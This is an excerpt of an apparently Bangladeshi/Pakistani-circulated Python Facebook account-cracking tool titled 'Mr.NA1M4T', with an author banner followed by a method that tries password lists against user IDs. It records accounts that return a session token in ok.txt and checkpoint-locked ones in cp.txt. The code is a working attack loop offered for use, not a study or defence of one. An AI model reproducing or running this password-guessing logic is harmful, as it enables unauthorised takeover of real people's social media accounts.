...
░  ░    ░  ░  ░      ░  ░         ░ 
   ...
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { Mr.NA1M4T }   ║
   \x1b[1;92m║ AUTHOR    : MR. NA1M4T      ║
   \x1b[1;92m║ GITHUB    : git.io/MrNA1M4T ║
   \x1b[1;92m║ FACEBOOK  : KHAN LALA   ║
   \x1b[1;92m║ Group     :  BANGASH GANG ║
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [NAIMAT-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * [NAIMAT]--> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [NAIMAT-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * [NAIMAT]--> %s|%s\n"%(uid, pw))
				break
			else:
				continue
